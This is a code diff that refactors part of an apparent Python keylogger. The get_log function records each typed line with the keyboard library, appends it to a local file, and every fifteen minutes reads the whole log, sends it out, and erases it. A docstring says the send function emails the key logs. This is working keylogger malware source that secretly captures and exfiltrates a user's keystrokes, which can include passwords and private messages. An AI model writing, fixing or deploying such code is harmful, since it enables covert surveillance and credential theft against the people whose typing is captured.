@@ -37,21 +37,20 @@ class App():
         def get_log():
             """log/send/repeat"""
             now = time.time()
-            file = open('log.txt', 'r+')
-            while True: 
-                log = keyboard.get_typed_strings(keyboard.record(until='enter'))
-                file.write(next(log) + '\n')
-                if now <= (time.time() - 900): #send every 15 mins
-                    try:
-                        file.seek(0) #back to start of file 
-                        logged = file.read() #read in whole file
-                        send(logged) #send it out
-                        file.seek(0) #back to start of file and erase
-                        file.truncate()
-                        now = time.time() #reset the time variable
-                    except: #if file was unable to be sent continue logging 
-                        continue
-            file.close()
+            with open('log.txt', 'r+') as file:
+                while True: 
+                    log = keyboard.get_typed_strings(keyboard.record(until='enter'))
+                    file.write(next(log) + '\n')
+                    if now <= (time.time() - 900): #send every 15 mins
+                        try:
+                            file.seek(0) #back to start of file 
+                            logged = file.read() #read in whole file
+                            send(logged) #send it out
+                            file.seek(0) #back to start of file and erase
+                            file.truncate()
+                            now = time.time() #reset the time variable
+                        except: #if file was unable to be sent continue logging 
+                            continue
 
         def send(logged):
             """"Send the key logs to email"""
